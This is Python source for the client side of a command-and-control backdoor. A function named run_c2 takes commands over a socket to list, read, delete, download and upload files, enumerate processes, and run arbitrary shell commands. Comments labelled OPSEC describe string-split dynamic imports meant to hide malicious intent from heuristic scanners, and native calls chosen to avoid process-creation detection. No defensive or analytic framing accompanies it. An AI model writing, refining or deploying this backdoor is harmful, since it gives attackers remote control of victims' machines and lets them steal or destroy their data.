def run_c2():
    global client_socket
    
    # OPSEC: Dynamic imports to hide malicious intent from basic heuristic scanners
    os_mod = __import__('o' + 's')
    subp_mod = __import__('sub' + 'process')
    
    os_chdir = getattr(os_mod, 'ch' + 'dir')
    os_getcwd = getattr(os_mod, 'get' + 'cwd')
    os_listdir = getattr(os_mod, 'list' + 'dir')
    os_remove = getattr(os_mod, 're' + 'move')
    os_path = getattr(os_mod, 'pa' + 'th')
    os_path_exists = getattr(os_path, 'exi' + 'sts')
    subp_run = getattr(subp_mod, 'ru' + 'n')
    
    while True:
        try:
            cmd = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()
            if not cmd or cmd.lower() == 'exit': 
                break
            
            # ============================================================
            # OPSEC: Native Python implementations to avoid Process Creation
            # ============================================================
            
            if cmd.startswith('cd '):
                try: 
                    os_chdir(cmd[3:].strip())
                    client_socket.send(b"\n")
                except Exception as e: 
                    client_socket.send(f"{e}\n".encode())
                continue
                
            elif cmd == 'pwd':
                try:
                    client_socket.send((os_getcwd() + "\n").encode('utf-8'))
                except Exception as e:
                    client_socket.send(f"{e}\n".encode())
                continue
                
            elif cmd == 'ls' or cmd.startswith('ls '):
                target_dir = cmd[3:].strip() or '.'
                try:
                    files = os_listdir(target_dir)
                    out = '\n'.join(files) if files else ' '
                    client_socket.send((out + "\n").encode('utf-8'))
                except Exception as e:
                    client_socket.send(f"{e}\n".encode())
                continue
                
            elif cmd.startswith('cat '):
                try:
                    with open(cmd[4:].strip(), 'r', encoding='utf-8', errors='ignore') as f:
                        out = f.read()
                        client_socket.send((out if out else ' \n').encode('utf-8'))
                except Exception as e:
                    client_socket.send(f"{e}\n".encode())
                continue
                
            elif cmd.startswith('rm '):
                try:
                    os_remove(cmd[3:].strip())
                    client_socket.send(b"File removed.\n")
                except Exception as e:
                    client_socket.send(f"{e}\n".encode())
                continue
                
            elif cmd.startswith('download '):
                target_file = cmd[9:].strip()
                try:
                    if not os_path_exists(target_file):
                        client_socket.send(b"ERROR: File not found.\n")
                        continue
                    
                    with open(target_file, 'rb') as f:
                        data = f.read()
                        # Send the length first as a header, then the file data
                        import struct
                        length_header = struct.pack('>I', len(data))
                        client_socket.sendall(length_header + data)
                        # We don't send a trailing newline here because we're sending raw bytes
                except Exception as e:
                    client_socket.send(f"ERROR: {e}\n".encode())
                continue
                
            elif cmd.startswith('upload '):
                parts = cmd.split(' ', 2)
                if len(parts) < 3:
                    client_socket.send(b"ERROR: Usage: upload <remote_path> <file_size>\n")
                    continue
                    
                target_path = parts[1]
                try:
                    file_size = int(parts[2])
                    client_socket.send(b"READY\n")
                    
                    # Read the exact amount of bytes
                    data = bytearray()
                    while len(data) < file_size:
                        packet = client_socket.recv(file_size - len(data))
                        if not packet:
                            break
                        data.extend(packet)
                        
                    with open(target_path, 'wb') as f:
                        f.write(bytes(data))
                        
                    client_socket.send(b"Upload complete.\n")
                except Exception as e:
                    client_socket.send(f"ERROR: {e}\n".encode())
                continue
                
            elif cmd == 'ps':
                try:
                    # Pure Python process enumeration by reading /proc (Linux/Android)
                    if hasattr(os_mod, 'uname'):
                        out = "PID\tNAME\n"
                        for pid in os_listdir('/proc'):
                            if pid.isdigit():
                                try:
                                    with open(f"/proc/{pid}/comm", 'r') as f:
                                        name = f.read().strip()
                                        out += f"{pid}\t{name}\n"
                                except Exception:
                                    pass
                        client_socket.send((out if out else ' \n').encode('utf-8'))
                    else:
                        # Fallback for non-linux systems where /proc doesn't exist
                        proc = subp_run('tasklist' if os_mod.name == 'nt' else 'ps -A', shell=True, capture_output=True, text=True)
                        out = proc.stdout + proc.stderr
                        client_socket.send((out if out else ' \n').encode('utf-8'))
                except Exception as e:
                    client_socket.send(f"{e}\n".encode())
                continue

            # ============================================================
            # NOISY FALLBACK: Only spawn a process if absolutely necessary
            # ============================================================
            try:
                proc = subp_run(cmd, shell=True, capture_output=True, text=True)
                out = proc.stdout + proc.stderr
                # Send at least a space if no output so the listener loop doesn't hang
                if not out:
                    out = " "
                client_socket.send((out + "\n").encode('utf-8', errors='ignore'))
            except Exception as e:
                client_socket.send(f"{e}\n".encode('utf-8'))
                
        except Exception:
            break

run_c2()